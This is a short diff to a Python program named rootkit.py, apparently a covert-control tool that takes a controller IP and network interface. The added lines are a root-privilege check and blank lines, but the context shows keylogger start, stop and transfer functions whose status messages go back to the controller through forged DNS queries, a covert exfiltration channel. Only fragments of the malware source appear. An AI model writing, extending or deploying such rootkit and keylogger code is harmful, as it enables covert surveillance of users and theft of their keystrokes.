@@ -32,6 +32,12 @@ from watchdog.observers import Observer
 from watchdog.events import PatternMatchingEventHandler, FileSystemEventHandler
 
 
+# Check for root privileges.
+if os.geteuid() != 0:
+    print("ERROR: Root privileges are required to run this program!", file=sys.stderr)
+    exit(1)
+
+
 PARSER = argparse.ArgumentParser("./rootkit.py")
 PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
 PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
@@ -272,6 +278,7 @@ def execute_watch_command(path: str) -> bool:
     send_dns_query(query)
     return True
 
+
 def stop_keylogger():
     if KEYLOGGER_INSTANCE.stop():
         print("SUCCESS: Stopped keylogger")
@@ -292,6 +299,7 @@ def start_keylogger():
         print("FAILED: You can't start an active keylogger")
         query = forge_dns_query_stream("FAILED: You can't start an active keylogger", GENERAL_MSG_IDENTIFICATION)
         send_dns_query(query)
+
 
 def transfer_keylogger():
     data = KEYLOGGER_INSTANCE.get_keylog()
